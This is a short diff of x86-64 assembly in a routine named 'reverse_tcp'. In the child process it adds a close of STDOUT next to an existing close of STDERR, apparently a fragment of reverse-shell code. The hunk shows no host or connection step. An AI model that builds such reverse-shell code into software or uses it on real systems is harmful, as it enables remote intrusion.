@@ -25,6 +25,9 @@ reverse_tcp:
 
     ; ====== CHILD ====== ;
     mov     rax, 3
+    mov     rdi, 1  ; close(STDOUT);
+    syscall
+    mov     rax, 3
     mov     rdi, 2  ; close(STDERR);
     syscall
 
